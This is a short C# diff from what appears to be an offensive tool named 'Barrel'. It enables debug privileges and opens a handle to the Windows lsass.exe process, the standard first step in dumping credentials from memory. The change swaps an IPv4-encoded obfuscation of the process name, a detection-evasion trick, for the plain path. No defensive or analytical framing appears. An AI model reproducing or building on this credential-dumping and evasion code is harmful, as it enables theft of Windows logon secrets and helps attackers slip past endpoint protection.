@@ -300,8 +300,9 @@ namespace Barrel
             EnableDebugPrivileges();
 
             // Decode process name (C:\\WINDOWS\\system32\\lsass.exe)
-            List<string> process_name_ipv4_encoded = new List<string> { "67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0" };
-            string proc_name = decodeIPv4(process_name_ipv4_encoded);
+            // List<string> process_name_ipv4_encoded = new List<string> { "67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0" };
+            // string proc_name = decodeIPv4(process_name_ipv4_encoded);
+            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";
 
             // Get process handle
             IntPtr processHandle = GetProcessByName(proc_name);
